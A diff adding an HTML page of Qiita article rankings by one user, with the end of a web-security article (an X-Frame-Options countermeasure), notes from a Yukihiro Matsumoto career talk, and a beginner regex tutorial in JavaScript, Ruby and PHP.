+<span id="対策-10" class="fragment"></span><a href="#%E5%AF%BE%E7%AD%96-10"><i class="fa fa-link"></i></a>対策</h2>
+
+<p>ヘッダのパラメータとして、<strong>X-Frame-Options</strong>を設定します。そして、DENYまたはSAMEORIGINを設定します。</p>
+
+<p><a href="https://developer.mozilla.org/ja/docs/Web/HTTP/X-Frame-Options" rel="nofollow noopener" target="_blank">X-Frame-Options レスポンスヘッダ</a></p>
+
+<h1>
+<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h1>
+
+<p>これだけ種類があると頭が混乱してしまいますが、Web業界にいる人は職種を問わずセキュリティの知識が必要だなと思わされる今日この頃です。</p>
+
+<p>後半になるにつれて勉強不足で簡素になってしまいましたが、間違っている部分、足りない部分などあれば編集リクエストやコメントでご指摘頂きたいです。</p>
+</div>
+	</td>
+</tr>
+</table>
+<br />
+<table border="1">
+<tr>
+	<td rowspan="3"><center>Tsutouさんの<br />2位</center></td>
+	<td colspan="4">
+		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>26</kbd>
+		<a target="_blank" href="https://qiita.com/Tsutou/items/50be50cdb200f1e31d1c">[ まつもとゆきひろ氏 ]若手エンジニアの生存戦略</a>
+	</td>
+</tr>
+<tr>
+	<td style="width:100px;"><center>投稿日時</center></td>
+	<td style="width:200px;"><center>投稿者</center></td>
+	<td style="width:150px;"><center>タグ</center></td>
+	<td style="width:350px;"><center>本文</center></td>
+</tr>
+<tr>
+	<td style="width:100px;">
+		<!--投稿日時--><center>2017-09-16 20:16:53</center>
+	</td>
+	<td style="width:200px;">
+		@Tsutou<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/187392/profile-images/1505559295">
+	</td>
+	<td style="width:150px;">
+		<!--タグ-->
+		<center><b>[Ruby]</b> <b>[キャリア]</b> <b>[若手]</b> <b>[生存戦略]</b> <b>[まつもとゆきひろ]</b> </center>
+	</td>
+	<td style="width:350px;">
+		<!--本文-->
+		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>エンジニアになるのは10月からですが、参加してきました。</p>
+
+<p>以下素人なりに、自分なりの解釈でザックリ、まとめたいと思います。</p>
+
+<h2>
+<span id="以下本日の内容まとめたものになります" class="fragment"></span><a href="#%E4%BB%A5%E4%B8%8B%E6%9C%AC%E6%97%A5%E3%81%AE%E5%86%85%E5%AE%B9%E3%81%BE%E3%81%A8%E3%82%81%E3%81%9F%E3%82%82%E3%81%AE%E3%81%AB%E3%81%AA%E3%82%8A%E3%81%BE%E3%81%99"><i class="fa fa-link"></i></a>以下、本日の内容まとめたものになります。</h2>
+
+<h1>
+<span id="まつもとゆきひろ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A4%E3%82%82%E3%81%A8%E3%82%86%E3%81%8D%E3%81%B2%E3%82%8D"><i class="fa fa-link"></i></a>まつもとゆきひろ</h1>
+
+<p>皆様ご存知、Rubyの開発者です。</p>
+
+<h1>
+<span id="導入" class="fragment"></span><a href="#%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>導入</h1>
+
+<p>ロールモデルの生存戦略は人によって違う。ただ、抽象化して当てはめることはできる。</p>
+
+<p>成功者のパターン学習により、成功に近づく。</p>
+
+<p>スタートアップ成功者共通の特質 : パターン認識能力</p>
+
+<p>バタフライ・エフェクト : 些細な違いのインフルエンスが結果を大きく変える。</p>
+
+<p>世の中のだいたいのHowTo本は美化されている。パターンとして認識し実行する程度にとどめておく。</p>
+
+<h1>
+<span id="まつもとさんの略歴" class="fragment"></span><a href="#%E3%81%BE%E3%81%A4%E3%82%82%E3%81%A8%E3%81%95%E3%82%93%E3%81%AE%E7%95%A5%E6%AD%B4"><i class="fa fa-link"></i></a>まつもとさんの略歴</h1>
+
+<p><code>12歳でpcを触る。ボードマイコンに遭遇。<br>
+15歳でポケコン( ４００行制限、ユーザー定義関数なし、変数は一文字 )。pcについてわかってくるようになる。<br>
+「pascal入門」に出会う（ 当時で言うところのC言語 ）、ひたすら写経<br>
+世の中の、目的に沿ってデザインされた様々なプログラミング言語に興味を持つ。<br>
+大学に進学。コンピュータサイエンスを学ぶ。当時からプログラミング言語を作りたいと言う欲求はあった。研究室は言語開発でなく、コンパイルについて。<br>
+卒業後、東京で働きたくなかった。鳥取→筑波→？<br>
+浜松に就職。同期200人、CS専攻6人のバブル採用。<br>
+鶏口牛後。ソフトウェアがどうあるべきか若いうちから裁量を持てた。<br>
+「みんながやっている」は我慢の理由にならない。<br>
+我慢に価値はない。日本の社会的圧力としてある程度存在している。</code></p>
+
+<h1>
+<span id="プログラマ三代美徳" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9E%E4%B8%89%E4%BB%A3%E7%BE%8E%E5%BE%B3"><i class="fa fa-link"></i></a>プログラマ三代美徳</h1>
+
+<ul>
+<li>怠惰- サボるための労力を惜しまない。効率化を追い求める。</li>
+<li>短期- コンピュータが怠慢な時に感じる怒り。改善しようとプログラム改変を行いがち。</li>
+<li>傲慢- 自分の作品(プログラム)に自信を持つ。</li>
+</ul>
+
+<h1>
+<span id="死の鎖--日本社会的同調圧力" class="fragment"></span><a href="#%E6%AD%BB%E3%81%AE%E9%8E%96--%E6%97%A5%E6%9C%AC%E7%A4%BE%E4%BC%9A%E7%9A%84%E5%90%8C%E8%AA%BF%E5%9C%A7%E5%8A%9B"><i class="fa fa-link"></i></a>死の鎖 : 日本社会的同調圧力</h1>
+
+<p>社会的な同調圧力に対しては鈍感であるべき。<br>
+Ex).少数派に所属し、競争を避ける。松本さんは、プログラミング言語がニッチな分野だったからこそ、突出できた。</p>
+
+<ul>
+<li>積極的に裏技を見つける</li>
+<li>あえて空気を読まない</li>
+<li>目的を明確化する</li>
+</ul>
+
+<h3>
+<span id="dont-work-hard--work-smart" class="fragment"></span><a href="#dont-work-hard--work-smart"><i class="fa fa-link"></i></a>Don’t work hard , work smart.</h3>
+
+<h1>
+<span id="拒否の仕方" class="fragment"></span><a href="#%E6%8B%92%E5%90%A6%E3%81%AE%E4%BB%95%E6%96%B9"><i class="fa fa-link"></i></a>拒否の仕方</h1>
+
+<p>エンジニアは、上の言うことを聞くことが仕事ではない。<br>
+ソフトウェアを開発し、会社に利益を与えることが仕事。</p>
+
+<p>ただ、わがままを受けてもらえる土壌は信頼関係があってこそ。</p>
+
+<h1>
+<span id="winとloseの組み合わせ" class="fragment"></span><a href="#win%E3%81%A8lose%E3%81%AE%E7%B5%84%E3%81%BF%E5%90%88%E3%82%8F%E3%81%9B"><i class="fa fa-link"></i></a>WinとLoseの組み合わせ</h1>
+
+<p>7つの習慣より<br>
+永続的な取引ができるのは2/7<br>
+→　Win WinまたNo Deal</p>
+
+<h1>
+<span id="結局のところ自分を知ることが一番大事" class="fragment"></span><a href="#%E7%B5%90%E5%B1%80%E3%81%AE%E3%81%A8%E3%81%93%E3%82%8D%E8%87%AA%E5%88%86%E3%82%92%E7%9F%A5%E3%82%8B%E3%81%93%E3%81%A8%E3%81%8C%E4%B8%80%E7%95%AA%E5%A4%A7%E4%BA%8B"><i class="fa fa-link"></i></a>結局のところ、自分を知ることが一番大事。</h1>
+
+<p>武器を伸ばし、短所を認識する。<br>
+松本さんの武器はプログラミング言語だった。</p>
+
+<h1>
+<span id="思い込みについて自覚的になる" class="fragment"></span><a href="#%E6%80%9D%E3%81%84%E8%BE%BC%E3%81%BF%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6%E8%87%AA%E8%A6%9A%E7%9A%84%E3%81%AB%E3%81%AA%E3%82%8B"><i class="fa fa-link"></i></a>思い込みについて自覚的になる</h1>
+
+<p>思い込み　==　キャッシュ<br>
+インバリデーションのないキャッシュ<br>
+意識的キャッシュインバリデーション<br>
+思い込みはとても怖いもの。知らず知らずに間違った方向に進んでしまう。プログラムのバグも同じ。<br>
+プログラマーの仕事は問題解決→問題把握→分析→ソリューション提案→ソリューション実装→テスト<br>
+Ex.) よくやる失敗を弾き出す。→もっと便利なツールを</p>
+
+<p>同じ原則は人生に適用できる。プログラマは人生の勝ち組になりやすい。かも。</p>
+
+<h1>
+<span id="コントロール意識" class="fragment"></span><a href="#%E3%82%B3%E3%83%B3%E3%83%88%E3%83%AD%E3%83%BC%E3%83%AB%E6%84%8F%E8%AD%98"><i class="fa fa-link"></i></a>コントロール意識</h1>
+
+<p>生産性を下げるものは何か？</p>
+
+<p>一説によれば、叱るとエンジニアの生産性は60%下がる</p>
+
+<p>まつもと氏の見解では、強制されると生産性が下がる、つまり個々人のコントロール意識を制限すると生産性は下がる。<br>
+逆を言えば、コントロール意識、裁量を持つ、持たせることが生産性を高めることにつながる。</p>
+
+<h1>
+<span id="アルファシンドローム逆アルファシンドローム" class="fragment"></span><a href="#%E3%82%A2%E3%83%AB%E3%83%95%E3%82%A1%E3%82%B7%E3%83%B3%E3%83%89%E3%83%AD%E3%83%BC%E3%83%A0%E9%80%86%E3%82%A2%E3%83%AB%E3%83%95%E3%82%A1%E3%82%B7%E3%83%B3%E3%83%89%E3%83%AD%E3%83%BC%E3%83%A0"><i class="fa fa-link"></i></a>アルファシンドローム・逆アルファシンドローム</h1>
+
+<p>プログラマの楽しみの根源は万能感にある。<br>
+コンピュータをあくまで道具として使う。<br>
+コンピュータはあくまでツール、奴隷になるな。<br>
+恐れ、不安、疑念は自分の価値と関係はない。</p>
+
+<h1>
+<span id="勉強する" class="fragment"></span><a href="#%E5%8B%89%E5%BC%B7%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>勉強する</h1>
+
+<p>本を読む。インプットでは差別化要因になりづらい。<br>
+アウトプットこそが差別化要因につながる。<br>
+羞恥心を捨てる。<br>
+チャンスがない。　→　アウトプットを恐れている<br>
+人間の可塑性(環境適応能力)にかける。立場によって人間は成長、変化することができる。<br>
+心理的な怖さを乗り越えて、可塑性にかけアウトプットする。<br>
+ソフトウェアエンジニアにとって心理的、人間的な側面がとても大切。</p>
+
+<h1>
+<span id="qa" class="fragment"></span><a href="#qa"><i class="fa fa-link"></i></a>Q&amp;A</h1>
+
+<p>・意思の強い部下ができたら<br>
+組織の秩序を守るか、エンジニアリングを大切にするのか。答えがどうであれ指導指針をブラさない。</p>
+
+<p>・女性エンジニアとして生き残るには<br>
+根本として信頼関係を構築できればいいので、男性エンジニアと差のない組織に行けばいい。</p>
+
+<p>・人格者として振る舞う<br>
+お互いが‘ フェア ’ であることを大切に。</p>
+
+<p>・失敗について<br>
+Ruby開発中、Perlを参考に余分な機能を入れてしまった。</p>
+
+<p>・会社員かフリーランスか<br>
+正解はない。柔軟に環境に時代に合わせて対応しよう。</p>
+
+<p>・情報収集方式は？<br>
+大したことはしてない。<br>
+Twitter<br>
+RSSリーダー　→　hacker news ,stack overflow,Reddit</p>
+
+<p>・大学は畑違いだったが、コンピュータサイエンスをまなびたい<br>
+今から体系的な勉強するのは現実的でないので、ボトムアップで知りたいことから広げていく。</p>
+
+<h3>
+<span id="以上箇条書きですが右も左も分からない状態で業界に飛び込もうとしている身としてとても充実した時間を過ごせました" class="fragment"></span><a href="#%E4%BB%A5%E4%B8%8A%E7%AE%87%E6%9D%A1%E6%9B%B8%E3%81%8D%E3%81%A7%E3%81%99%E3%81%8C%E5%8F%B3%E3%82%82%E5%B7%A6%E3%82%82%E5%88%86%E3%81%8B%E3%82%89%E3%81%AA%E3%81%84%E7%8A%B6%E6%85%8B%E3%81%A7%E6%A5%AD%E7%95%8C%E3%81%AB%E9%A3%9B%E3%81%B3%E8%BE%BC%E3%82%82%E3%81%86%E3%81%A8%E3%81%97%E3%81%A6%E3%81%84%E3%82%8B%E8%BA%AB%E3%81%A8%E3%81%97%E3%81%A6%E3%81%A8%E3%81%A6%E3%82%82%E5%85%85%E5%AE%9F%E3%81%97%E3%81%9F%E6%99%82%E9%96%93%E3%82%92%E9%81%8E%E3%81%94%E3%81%9B%E3%81%BE%E3%81%97%E3%81%9F"><i class="fa fa-link"></i></a>以上、箇条書きですが、右も左も分からない状態で業界に飛び込もうとしている身として、とても充実した時間を過ごせました。</h3>
+</div>
+	</td>
+</tr>
+</table>
+<br />
+<table border="1">
+<tr>
+	<td rowspan="3"><center>Tsutouさんの<br />3位</center></td>
+	<td colspan="4">
+		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>17</kbd>
+		<a target="_blank" href="https://qiita.com/Tsutou/items/1c04a2abe9fcc276740d">正規表現から逃げない [初学者向け]</a>
+	</td>
+</tr>
+<tr>
+	<td style="width:100px;"><center>投稿日時</center></td>
+	<td style="width:200px;"><center>投稿者</center></td>
+	<td style="width:150px;"><center>タグ</center></td>
+	<td style="width:350px;"><center>本文</center></td>
+</tr>
+<tr>
+	<td style="width:100px;">
+		<!--投稿日時--><center>2017-10-27 17:06:48</center>
+	</td>
+	<td style="width:200px;">
+		@Tsutou<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/187392/profile-images/1505559295">
+	</td>
+	<td style="width:150px;">
+		<!--タグ-->
+		<center><b>[Ruby]</b> <b>[PHP]</b> <b>[JavaScript]</b> <b>[正規表現]</b> <b>[文字列]</b> </center>
+	</td>
+	<td style="width:350px;">
+		<!--本文-->
+		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
+<h1>
+<span id="正規表現" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE"><i class="fa fa-link"></i></a>正規表現？</h1>
+
+<ul>
+<li>本記事は、正規表現の存在意義、使い方の導入です。</li>
+<li>各パターンのリファレンスなどは後述でまとめております。例示として、JavaScript、Ruby、PHPを使用しております。</li>
+</ul>
+
+<h1>
+<span id="プログラミングの勉強を始めた時誰でも出会う正規表現" class="fragment"></span><a href="#%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E3%81%AE%E5%8B%89%E5%BC%B7%E3%82%92%E5%A7%8B%E3%82%81%E3%81%9F%E6%99%82%E8%AA%B0%E3%81%A7%E3%82%82%E5%87%BA%E4%BC%9A%E3%81%86%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE"><i class="fa fa-link"></i></a>プログラミングの勉強を始めた時、誰でも出会う正規表現。</h1>
+
+<p><strong>なんだこの暗号は、文字化けか？嫌がらせなのか？</strong>と私は直感的に感じました。その先正規表現に出会うたび、わかったふりをして逃げ回っていました。<br>
+ ですが、世に中には色々な人がいますね。<br>
+ 電話番号一つ取っても、<strong>090-XXXXX-XXXX</strong>か、<strong>090XXXXXXXX</strong>と入力するかは育って来た環境など、それぞれの流儀があるものです。<br>
+ 金額を入力するときだって、<strong>円</strong>なのか<strong>$</strong>なのか<strong>￥</strong>なのか<strong>数字だけ</strong>なのか、桁数で区切るのか、それぞれのポリシーがあるものです。<br>
+ ユーザーに気持ちよく利用してもらうためには、入力の際の変なルールはできるだけ省くべきでしょう。しかし、裏側での処理ではデータ形式を<strong>統一</strong>しないとコンピュータはどうしていいかわかりません。</p>
+
+<h3>
+<span id="そこで必要になるのがみんな大好き正規表現ですね" class="fragment"></span><a href="#%E3%81%9D%E3%81%93%E3%81%A7%E5%BF%85%E8%A6%81%E3%81%AB%E3%81%AA%E3%82%8B%E3%81%AE%E3%81%8C%E3%81%BF%E3%82%93%E3%81%AA%E5%A4%A7%E5%A5%BD%E3%81%8D%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%81%A7%E3%81%99%E3%81%AD"><i class="fa fa-link"></i></a>そこで必要になるのが、みんな大好き、<strong>正規表現</strong>ですね。</h3>
+
+<h1>
+<span id="正規表現とは" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%81%A8%E3%81%AF"><i class="fa fa-link"></i></a>正規表現とは</h1>
+
+<blockquote>
+<p><strong><em>正規表現（Regular Expression）とは、特定の文字列をパターン化して記号で表現する手法</em></strong><br>
+<a href="https://ferret-plus.com/8391" rel="nofollow noopener" target="_blank"><img alt=":airplane:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/2708-fe0f.png" title=":airplane:" width="20"> 引用 : 押さえておきたい！正規表現の利用方法をわかりやすく解説</a></p>
+
+<p><strong><em>正規表現とは、文字列の特徴(パターン)を記号化して表現するものです。</em></strong><br>
+<a href="http://hodade.com/seiki/page.php?study1" rel="nofollow noopener" target="_blank"><img alt=":airplane:" class="emoji" height="20" src="https://cdn.qiita.com/emoji/twemoji/unicode/2708-fe0f.png" title=":airplane:" width="20"> 引用 : すぐ使える！正規表現サンプル集</a></p>
+</blockquote>
+
+<p>とあります、ことWeb開発で使用する場合は、主にフォームに入力される文字列に対して使用されます。<br>
+ ですから、JavaScriptの正規表現オブジェクト生成、<font color="aqua">RegExp( , )</font>の意味がわかりますね。知らなかったけど。<br>
+要は<strong>文字の並び(文字列)にある文字が含まれているかの確認や、特定の文字を消してフォーマットするといった、ある種の<font color="orange"> フォーマット技法</font></strong></p>
+
+<h2>
+<span id="実例文字列置換行末一致処理" class="fragment"></span><a href="#%E5%AE%9F%E4%BE%8B%E6%96%87%E5%AD%97%E5%88%97%E7%BD%AE%E6%8F%9B%E8%A1%8C%E6%9C%AB%E4%B8%80%E8%87%B4%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a>実例(文字列置換、行末一致処理)</h2>
+
+<h2>
+<span id="javascript" class="fragment"></span><a href="#javascript"><i class="fa fa-link"></i></a>Javascript</h2>
+
+<div class="code-frame" data-lang="javascript">
+<div class="code-lang"><span class="bold">regexp.js</span></div>
+<div class="highlight"><pre><span></span><span class="c1">//文字列置換(/-/で-にマッチするものを、空文字に置換)</span>
+<span class="c1">//=&gt;つまり、ハイフンが含まれていれば取り除くという処理</span>
+<span class="kd">var</span> <span class="nx">post</span> <span class="o">=</span> <span class="s1">'090-1234-5678'</span><span class="p">;</span>
+<span class="nx">post</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/-/</span><span class="p">,</span> <span class="s2">""</span><span class="p">);</span>
+<span class="o">=&gt;</span> <span class="s1">'09012345678'</span>
+
+<span class="c1">//文字列抽出(\dは数字にマッチするか,{}は桁数マッチ,$は末尾からマッチ)</span>
+<span class="c1">//=&gt;つまり、下四桁を抽出して切り出す処理、「\d」による判定が後ろから4回発生するということ。</span>
+<span class="kd">var</span> <span class="nx">birth</span> <span class="o">=</span> <span class="s2">"19910422"</span><span class="p">;</span>
+<span class="nx">birth</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="sr">/\d{4}$/</span><span class="p">);</span>
+<span class="o">=&gt;</span> <span class="s2">"0422"</span>
+</pre></div>
+</div>
+
+<h2>
+<span id="ruby" class="fragment"></span><a href="#ruby"><i class="fa fa-link"></i></a>Ruby</h2>
+
+<div class="code-frame" data-lang="ruby">
+<div class="code-lang"><span class="bold">regexp.rb</span></div>
+<div class="highlight"><pre><span></span><span class="c1">#gsubは当てはまるものすべてを置換。(subは最初の１つ)</span>
+<span class="n">post</span> <span class="o">=</span> <span class="s1">'090-1234-5678'</span>
+<span class="n">post</span> <span class="o">=</span> <span class="n">post</span><span class="o">.</span><span class="n">gsub</span><span class="p">(</span><span class="sr">/-/</span><span class="p">,</span> <span class="s2">""</span><span class="p">)</span>
+<span class="o">=&gt;</span> <span class="s1">'09012345678'</span>
+
+<span class="n">birth</span> <span class="o">=</span> <span class="s2">"19910422"</span>
+<span class="n">birth</span> <span class="o">=</span> <span class="n">birth</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sr">/\d{4}$/</span><span class="p">)</span>
+<span class="nb">p</span> <span class="n">birth</span>
+<span class="o">=&gt;</span> <span class="c1">#&lt;MatchData "0422"&gt;</span>
+</pre></div>
+</div>
+
+<blockquote>
+<p>@scivolaさん<br>
+またJavaScript の $ は，m オプションを付けない場合，文字列の末尾を表します。</p>
+
+<p>対して Ruby の $ は，行末を表します。</p>
+</blockquote>
+
+<p>ですので、改行が行われる場合はRuby では<strong>/\d{4}$/</strong>ではなく<strong>/\d{4}\z/</strong>になるみたいです。</p>
+
+<h2>
+<span id="php" class="fragment"></span><a href="#php"><i class="fa fa-link"></i></a>PHP</h2>
+
+<div class="code-frame" data-lang="php">
+<div class="code-lang"><span class="bold">regexp.php</span></div>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">// Your code here!</span>
+<span class="nv">$post</span> <span class="o">=</span> <span class="s1">'090-1234-5678'</span><span class="p">;</span>
+<span class="c1">//置換して再代入</span>
+<span class="nv">$post</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/-/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$post</span><span class="p">);</span>
+
+<span class="nv">$birth</span> <span class="o">=</span> <span class="mi">19910422</span><span class="p">;</span>
+<span class="c1">//抽出して再代入</span>
+<span class="nv">$birth</span> <span class="o">=</span> <span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\d{4}$/'</span><span class="p">,</span><span class="nv">$birth</span><span class="p">,</span> <span class="nv">$birthday</span><span class="p">);</span>
+<span class="c1">//配列として取り出し</span>
+<span class="k">echo</span> <span class="nv">$birthday</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="o">=&gt;</span><span class="mo">0422</span>
+</pre></div>
+</div>
+
+<blockquote>
+<p>また、PHPには正規表現リテラルは存在しないそうなので、デリミターを付与してあげるみたいです。スラッシュに限らないそうです。</p>
+
+<blockquote>
+<p>@chitokuさん<br>
+また、PHP にも正規表現リテラルはないため文字列に任意の 1 バイトのデリミターを含めて表します（記事通りです）。</p>
+</blockquote>
+</blockquote>
+
+<div class="code-frame" data-lang="php">
+<div class="code-lang"><span class="bold">regexp.php</span></div>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">// デリミターに / を使います</span>
+<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/\d{4}/'</span><span class="p">,</span> <span class="s1">'1234'</span><span class="p">);</span>
+
+<span class="c1">// デリミターは変更できます</span>
+<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'@\d{4}@'</span><span class="p">,</span> <span class="s1">'1234'</span><span class="p">);</span>
+
+<span class="c1">// たとえば / がたくさん含まれる場合は変えたほうが読みやすいです</span>
+<span class="nb">preg_match</span><span class="p">(</span><span class="s1">'|(/\d*)+|'</span><span class="p">,</span> <span class="s1">'/1/2/3'</span><span class="p">)</span>
+</pre></div>
+</div>
+
+<p>上記の例を見るに正規表現オブジェクト生成の関数名は言語ごとに違うみたいですね。<br>
+<strong>しかし、共通するのは<font color="red">//</font>で囲った<font color="red">$</font>や<font color="red">\d</font>といった、正規表現パターンの記述です。</strong></p>
+
+<p>厳密には各言語の仕様によって(正規表現リテラルがない言語もある)異なるのですが、特殊なケースでない限り、基本的なパターンの記述は同じなので、覚えておいて損はないでしょう。<br>
+後述する各リファレンスを参照してもらえれば、基本的な記述はほぼ同じということがわかります。</p>
+
+<h2>
+<span id="正規表現エンジンより正確な記法" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%B3%E3%82%88%E3%82%8A%E6%AD%A3%E7%A2%BA%E3%81%AA%E8%A8%98%E6%B3%95"><i class="fa fa-link"></i></a>正規表現エンジン(より正確な記法)</h2>
+
+<p>各言語に組み込まれている正規表現エンジンは、細かく見ると違うそうです。<br>
+例えば、PHPは-m修飾子をつけない限り、文字列の途中に改行があった場合でも、文字列全体を1行と見なします。反対にRubyの正規表現機能は、デフォルトで複数行モードであるそうです。<br>
+正規表現によるバリデーション等で、完全一致を示す目的で<font color="red">^</font>と<font color="red">$</font>を用いる方法(上述例示の記法)が一般的ですが、正しくは<font color="red">\A</font>と<font color="red">\z</font>を用いる必要があるそうです。(PHPでもRubyでも)</p>
+
+<p>つまり、<font color="red">^</font>と<font color="red">$</font>で完全一致のチェックをしているつもりでも、データ末尾に改行が含まれている場合を見逃してしまう可能性があるみたいです。</p>
+
+<p>以下の記事がとても参考になりました。</p>
+
+<p><a href="https://blog.tokumaru.org/2014/03/z.html" rel="nofollow noopener" target="_blank">徳丸浩の日記</a></p>
+
+<p>またご指摘いただいた内容は下記になります。<br>
+<strong>マルチラインモード</strong>とは上述の、Rubyがデフォルトで複数行モードという事です。</p>
+
+<blockquote>
+<p>@t_o_jpさん</p>
+
+<ul>
+<li>
+<strong>1.実装にどのエンジンを使っているか(PHPの場合)</strong>
+
+<ul>
+<li>PCRE：preg系</li>
+<li>Oniguruma(鬼車)：mb_ereg系</li>
+<li>POSIX：ereg系 ＜ 現在は非推奨
+<br>
+<br>
+<strong>PHPでは以上の3種類があって、例えばpreg系とmb_ereg系とではデリミタの書き方が異なります※mb_ereg()はデリミタ不要</strong>
+<br>
+<br>
+</li>
+</ul>
+</li>
+<li>2.デフォルトの動作モードと<font color="red">$</font>の扱い
+
+<ul>
+<li>PHP：<font color="red">^</font>と<font color="red">$</font>は行頭と行末にマッチ</li>
+<li>JavaScript：PHPと同様だが\Aや\zは使えない</li>
+<li>Ruby：マルチラインモード
+<br>
+<strong>Rubyはデフォルトがマルチラインモードなので、例えばRailsで^や$を使ってると、「本当にそれ使っちゃって大丈夫？」と親切に指摘してくれたりします。</strong>
+</li>
+</ul>
+</li>
+</ul>
+
+<p>逆にPHPでは、\Aや\zを使って正しく書けていない正規表現をよく見かけます。</p>
+
+<div class="code-frame" data-lang="php">
+<div class="code-lang"><span class="bold">engine.php</span></div>
+<div class="highlight"><pre><span></span><span class="nv">$str</span> <span class="o">=</span> <span class="s2">"abcd</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>    <span class="c1">// 最後に改行があります</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/cd$/'</span><span class="p">,</span> <span class="nv">$str</span><span class="p">));</span>    <span class="c1">// int(1) 改行があってもマッチしてしまいます</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/cd$/D'</span><span class="p">,</span> <span class="nv">$str</span><span class="p">));</span>   <span class="c1">// int(0)</span>
+<span class="nb">var_dump</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/cd\z/'</span><span class="p">,</span> <span class="nv">$str</span><span class="p">));</span>   <span class="c1">// int(0)</span>
+</pre></div>
+</div>
+
+<p>ですので、正規表現はとても便利なものだというのは確かなのですが、「言語に初めから用意されている関数やフレームワークに処理を任せる」という考え方もとても大切になってきます。</p>
+</blockquote>
+
+<p>各言語の正規表現エンジンの特性を把握し、組み込まれたものに沿った、正しい処理を施してあげる事ができれば、より堅牢な処理、品質保証に繋がるかもしれません。もっと深く勉強したいと思いました。</p>
+
+<h2>
+<span id="各言語別正規表現まとめ" class="fragment"></span><a href="#%E5%90%84%E8%A8%80%E8%AA%9E%E5%88%A5%E6%AD%A3%E8%A6%8F%E8%A1%A8%E7%8F%BE%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>各言語別正規表現まとめ</h2>
+
+<h3>
+<span id="個人的に参照しやすかったサイトをまとめました" class="fragment"></span><a href="#%E5%80%8B%E4%BA%BA%E7%9A%84%E3%81%AB%E5%8F%82%E7%85%A7%E3%81%97%E3%82%84%E3%81%99%E3%81%8B%E3%81%A3%E3%81%9F%E3%82%B5%E3%82%A4%E3%83%88%E3%82%92%E3%81%BE%E3%81%A8%E3%82%81%E3%81%BE%E3%81%97%E3%81%9F"><i class="fa fa-link"></i></a>個人的に参照しやすかったサイトをまとめました</h3>
+
+<h4>
+<span id="javascript-1" class="fragment"></span><a href="#javascript-1"><i class="fa fa-link"></i></a>JavaScript</h4>
+
+<p><a href="https://developer.mozilla.org/ja/docs/Web/JavaScript/Guide/Regular_Expressions" rel="nofollow noopener" target="_blank">正規表現 - JavaScript | MDN</a></p>
+
+<h4>
+<span id="ruby-1" class="fragment"></span><a href="#ruby-1"><i class="fa fa-link"></i></a>Ruby</h4>
+
+<p><a href="https://docs.ruby-lang.org/ja/2.4.0/doc/spec=2fregexp.html" rel="nofollow noopener" target="_blank">正規表現 (Ruby 2.4.0)</a></p>
+
+<h4>
+<span id="php-1" class="fragment"></span><a href="#php-1"><i class="fa fa-link"></i></a>PHP</h4>
+
+<p><a href="https://eng-entrance.com/php-regularex" rel="nofollow noopener" target="_blank">【5分でまるっと理解】PHP正規表現の使い方まとめ</a></p>
+
+<h2>
+<span id="おまけ" class="fragment"></span><a href="#%E3%81%8A%E3%81%BE%E3%81%91"><i class="fa fa-link"></i></a>おまけ</h2>
+
+<h4>
+<span id="チェックツール" class="fragment"></span><a href="#%E3%83%81%E3%82%A7%E3%83%83%E3%82%AF%E3%83%84%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>チェックツール</h4>
+
+<p><a href="https://qiita.com/AQRiL_1132/items/c185c7ad84c129e5a2df" id="reference-75af85e0d3a074549ea9">正規表現チェックツールまとめ-Qiita</a></p>
+
+<h4>
+<span id="いい表現悪い表現" class="fragment"></span><a href="#%E3%81%84%E3%81%84%E8%A1%A8%E7%8F%BE%E6%82%AA%E3%81%84%E8%A1%A8%E7%8F%BE"><i class="fa fa-link"></i></a>いい表現、悪い表現</h4>
+
+<p><a href="http://postd.cc/regexes-the-bad-the-better-and-the-best/" rel="nofollow noopener" target="_blank">正規表現：悪い表現、いい表現、最良の表現</a></p>
+
+<h2>
